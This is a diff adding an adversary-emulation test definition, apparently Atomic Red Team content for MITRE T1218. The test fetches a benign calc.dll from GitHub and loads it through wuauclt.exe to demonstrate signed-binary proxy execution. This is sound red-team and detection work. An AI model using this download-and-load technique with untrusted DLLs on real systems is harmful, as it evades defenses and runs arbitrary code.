@@ -1,0 +1,50 @@
+- id: 49fbd548-49e9-4bb7-94a6-3769613912b8
+  name: Load Arbitrary DLL via Wuauclt (Windows Update Client)
+  description: "This test uses Wuauclt to load an arbitrary DLL. Upon execution with\
+    \ the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/"
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      sh:
+        command: 'if (test-path "PathToAtomicsFolder\T1218\bin\calc.dll"){exit 0}
+          else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1218\bin\calc.dll")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true"
+          -OutFile "PathToAtomicsFolder\T1218\bin\calc.dll"; fi; wuauclt.exe /UpdateDeploymentProvider
+          "PathToAtomicsFolder\T1218\bin\calc.dll" /RunHandlerComServer'
+        cleanup: taskkill /f /im calculator.exe > nul 2>&1
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      arbitrary_dll:
+        description: Path of DLL to be loaded
+        type: string
+        default: PathToAtomicsFolder\T1218\bin\calc.dll
+    dependencies:
+    - description: 'DLL to load must exist on disk as specified location (#{arbitrary_dll})
+
+        '
+      prereq_command: 'if (test-path "#{arbitrary_dll}"){exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{arbitrary_dll}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true"
+        -OutFile "#{arbitrary_dll}"
+
+        '
+    technique_created: '2018-04-18T17:59:24.739Z'
+    atomic_guid: 49fbd548-49e9-4bb7-94a6-3769613912b8
+    import_timestamp: '2025-06-24T11:15:00.285910Z'
